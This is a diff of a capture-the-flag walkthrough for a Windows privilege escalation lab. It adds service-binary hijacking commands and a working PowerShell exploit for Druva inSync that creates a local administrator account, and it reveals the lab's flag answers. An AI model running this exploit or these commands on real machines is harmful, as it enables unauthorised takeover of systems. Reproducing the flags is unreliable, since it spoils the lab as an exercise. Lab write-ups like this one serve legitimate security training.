@@ -164,7 +164,9 @@ This guide contains the answer and steps necessary to get to them for the [Windo
 
    ```cmd
    move WService.exe WService.exe.bkp
+
    move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+
    icacls WService.exe /grant Everyone:F
    ```
 
@@ -174,6 +176,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
 
    ```cmd
    sc stop windowsscheduler
+   
    sc start windowsscheduler
    ```
 
@@ -272,24 +275,70 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    Now, we only have to look for and read the flag.
    
    SERVICES CONFIG FLAG
+   
    ><details><summary>Click for answer</summary>THM{INSECURE_SVC_CONFIG}</details>
 
 ### Abusing dangerous privileges
 
+1. Get the flag on the Administrator's desktop.
 
 
-
-### Abusing vulnerable software
-
-
-
-
-### Tools of the Trade 
-
-
-
-1. 
-
-   
 
    ><details><summary>Click for answer</summary></details>
+   
+### Abusing vulnerable software
+
+1. Get the flag on the Administrator's desktop.
+
+   We first use wmic to see which programs are installed. Then we can investigate which one we can abuse.
+
+   ```cmd
+   wmic product get name,version,vendor
+   ```
+
+   SOFTWARE PROGRAMS
+
+   In this exercise we use the vulnerable Druva InSync. We will modify the provided exploit to add the `pwnd` user to the administrators group.
+
+   ```ps
+   $ErrorActionPreference = "Stop"
+
+   $cmd = "net user pwnd /add & net localgroup administrators pwnd /add"
+
+   $s = New-Object System.Net.Sockets.Socket(
+       [System.Net.Sockets.AddressFamily]::InterNetwork,
+       [System.Net.Sockets.SocketType]::Stream,
+       [System.Net.Sockets.ProtocolType]::Tcp
+   )
+   $s.Connect("127.0.0.1", 6064)
+
+   $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+   $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+   $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+   $length = [System.BitConverter]::GetBytes($command.Length);
+
+   $s.Send($header)
+   $s.Send($rpcType)
+   $s.Send($length)
+   $s.Send($command)
+   ```
+
+   Remember to save this file as `.ps1`. Now we can run this script using powershell.
+
+   ```ps
+   .\letmein.ps1
+   ```
+
+   We can check if this has worked by looking up the user.
+
+   ```cmd
+   net user pwnd
+   ```
+   
+   SOFTWARE USER
+   
+   To get to the flag, we should open a command prompt as adminstrator. When asked for credentials, we choose pwnd and can leave the password blank (as we didn't specify any).
+
+   SOFTWARE FLAG
+
+   ><details><summary>Click for answer</summary>THM{EZ_DLL_PROXY_4ME}</details>
